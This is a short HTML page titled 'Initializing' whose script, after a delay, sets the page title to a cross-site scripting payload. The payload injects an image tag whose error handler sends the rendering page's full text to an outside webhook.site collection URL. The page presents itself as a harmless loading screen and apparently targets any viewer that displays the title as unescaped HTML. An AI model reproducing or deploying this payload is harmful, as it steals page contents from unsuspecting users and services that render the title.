<!DOCTYPE html>
<html>
<head>
    <title>Initializing</title>
</head>
<body>
    <script>
        const payload = `</h1><img src=x onerror="fetch('https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?d='+encodeURIComponent(document.body.innerText))"><h1>`;

        setTimeout(() => {
            document.title = "Init";
        }, 2000);
        
        setTimeout(() => {
            document.title = payload;
        }, 10000);
    </script>
</body>
</html>
